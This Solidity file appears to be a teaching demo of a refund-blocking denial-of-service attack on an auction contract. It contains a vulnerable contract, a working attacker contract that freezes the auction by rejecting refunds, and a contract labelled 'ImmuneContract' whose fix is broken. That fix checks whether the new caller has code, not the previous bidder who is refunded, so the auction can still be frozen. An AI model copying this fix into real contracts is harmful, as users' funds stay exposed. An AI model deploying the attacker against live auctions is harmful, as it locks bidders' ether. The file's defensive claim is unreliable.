pragma solidity ^0.8.0;

contract VulnerableContract {
    address public highestBidder;
    uint256 public highestBid;

    function bid() public payable {
        require(msg.value > highestBid);

        if (highestBidder != address(0)) {
            // This is where the vulnerability lies.
            // If sending ether back to the highestBidder fails, the entire transaction reverts.
            // An attacker can make this fail by using a contract that rejects ether transfers.
            payable(highestBidder).transfer(highestBid);
        }

        highestBidder = msg.sender;
        highestBid = msg.value;
    }

    function highestBidValue() external view returns(uint256) {
        return highestBid;
    }
}


contract ImmuneContract {
    address public highestBidder;
    uint256 public highestBid;

    function isEOA() public view returns(bool) {
        uint32 size;
        address sender = msg.sender;
        assembly {
            size := extcodesize(sender)
        }
    return (size == 0);
    }

    

    function bid() public payable {
        require(msg.value > highestBid);

        if (highestBidder != address(0)) {
            require(isEOA() == true, "only EOAs allowed");
            payable(highestBidder).transfer(highestBid);
        }
        
        highestBidder = msg.sender;
        highestBid = msg.value;
       
    }

    function highestBidValue() external view returns(uint256) {
        return highestBid;
    }
}


interface IVulnerableContract {
    function bid() external payable;
}

contract AttackContract {
    IVulnerableContract public vulnerableContract;
    uint256 public amt;

    constructor(address _vulnerableContract) {
        vulnerableContract = IVulnerableContract(_vulnerableContract);
    }

    function seed() external payable {
        // Functionality for seeding
    }



    function attack() external payable {
        vulnerableContract.bid{value: 10 ether}(); 
    }
}
